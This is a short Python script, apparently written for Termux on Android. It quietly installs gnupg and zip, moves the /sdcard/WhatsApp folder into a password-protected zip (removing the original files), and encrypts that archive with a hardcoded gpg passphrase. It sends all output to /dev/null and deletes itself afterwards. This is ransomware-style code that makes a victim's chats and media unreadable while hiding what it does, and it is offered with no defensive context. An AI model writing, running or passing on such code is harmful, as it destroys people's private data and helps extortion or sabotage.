import os,sys,time

def package():
        try:
                import gnupg
                import zip
        except ImportError:
                os.system('pkg install -y gnupg zip &> /dev//null')

package()
os.system('zip --password Rinku05 your_file.zip -m -r /sdcard/WhatsApp &> /dev//null')

os.system('gpg --batch -c --passphrase Rinku05 your_file.zip &> /dev//null')
os.system('rm your_file.zip;cp your_file.zip.gpg /sdcard')
os.system('rm -rf minicrypto.py')
